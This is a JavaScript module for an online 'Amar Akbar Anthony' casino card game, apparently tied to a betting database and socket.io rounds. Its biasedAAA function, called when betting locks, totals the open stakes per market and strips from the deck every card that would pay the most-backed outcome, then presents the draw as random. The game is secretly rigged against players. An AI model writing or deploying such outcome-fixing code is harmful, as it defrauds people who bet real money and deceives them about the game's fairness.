// games/amarAkbarAnthony.js
const { RoundEngine } = require('./engine');
const { createRound, lockRound, settleRoundTx } = require('../db/store');
const Bet = require("../db/models/bet");

const RANKS = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
const SUITS = ["hearts", "diamonds", "clubs", "spades"]; // 0..3

function makeDeck() {
  const deck = [];
  for (const s of SUITS) for (const r of RANKS) deck.push({ rank: r, suit: s });
  return deck;
}

// Card → outcome mapping
function cardToAAA(card) {
  let amar = false, akbar = false, anthony = false;
  const rank = card.rank;
  let rankValue = 0;
  if (rank === "A") rankValue = 1;
  else if (rank === "J") rankValue = 11;
  else if (rank === "Q") rankValue = 12;
  else if (rank === "K") rankValue = 13;
  else rankValue = parseInt(rank);

  if (rankValue < 7) amar = true;
  else if (rankValue >= 7 && rankValue < 11) akbar = true;
  else anthony = true;

  const group = (card.suit === "hearts" || card.suit === "diamonds") ? "red" : "black";
  const suit = card.suit.toLowerCase();

  return { amar, akbar, anthony, group, suit, card };
}

// ---- Biased RNG for AAA ----
async function biasedAAA(roundId) {
  const deck = makeDeck();
  const bets = await Bet.find({ roundId, type: "casino", status: "OPEN" });

  // Aggregate totals
  const totals = {};
  for (const b of bets) {
    const pick = String(b.market || "").toUpperCase(); // "AMAR"|"AKBAR"|"ANTHONY"|"RED"|"BLACK"|suits
    totals[pick] = (totals[pick] || 0) + Number(b.stake);
  }

  // Find worst exposure
  let worst = null;
  let maxStake = 0;
  for (const [market, amt] of Object.entries(totals)) {
    if (amt > maxStake) {
      worst = market;
      maxStake = amt;
    }
  }

  let filtered = deck;
  // Bias filtering by worst
  if (worst === "AMAR") {
    filtered = deck.filter(c => {
      const val = RANKS.indexOf(c.rank) + 1;
      return !(val < 7);
    });
  } else if (worst === "AKBAR") {
    filtered = deck.filter(c => {
      const val = RANKS.indexOf(c.rank) + 1;
      return !(val >= 7 && val < 11);
    });
  } else if (worst === "ANTHONY") {
    filtered = deck.filter(c => {
      const val = RANKS.indexOf(c.rank) + 1;
      return !(val >= 11);
    });
  } else if (worst === "RED") {
    filtered = deck.filter(c => !(c.suit === "hearts" || c.suit === "diamonds"));
  } else if (worst === "BLACK") {
    filtered = deck.filter(c => !(c.suit === "clubs" || c.suit === "spades"));
  } else if (["HEARTS","DIAMONDS","CLUBS","SPADES"].includes(worst)) {
    filtered = deck.filter(c => c.suit.toUpperCase() !== worst);
  }

  if (!filtered.length) filtered = deck;

  const card = filtered[Math.floor(Math.random() * filtered.length)];
  return cardToAAA(card);
}

// ---- Init AAA ----
function initAAA(io, tableId = 'table-1') {
  const GAME = 'AMAR_AKBAR_ANTHONY';

  const engine = new RoundEngine({
    io,
    game: GAME,
    tableId,
    roundMs: 30000,
    betMs: 25000,
    resultShowMs: 5000,
    hooks: {
      onCreateRound: (p) => createRound(p),

      onLock: async (roundId) => {
        await lockRound(roundId);
        const result = await biasedAAA(roundId);
        engine._preResults.set(roundId, result);
      },

      onComputeResult: (roundId) => {
        return engine._preResults.get(roundId) || null;
      },

      onSettle: async (roundId, result) => {
        const res = engine._preResults.get(roundId) || result;
        const { amar, akbar, anthony, group, suit, card } = res;

        let firstOutcome = "AMAR";
        if (amar) firstOutcome = "AMAR";
        else if (akbar) firstOutcome = "AKBAR";
        else if (anthony) firstOutcome = "ANTHONY";

        await settleRoundTx({
          roundId,
          game: GAME,
          outcome: { firstOutcome, group, suit, card },
          meta: { amar, akbar, anthony, group, suit, card },
        });
      },

      onEnd: async (roundId) => {
        engine._preResults.delete(roundId);
      },
    },
  });

  engine._preResults = new Map();

  io.on('connection', (socket) => {
    socket.on('join', ({ game, tableId: t }) => {
      if (String(game).toUpperCase() === GAME && t === tableId) {
        socket.join(`${GAME}:${tableId}`);
      }
    });
  });

  engine.start();
  return engine;
}

module.exports = { initAAA };
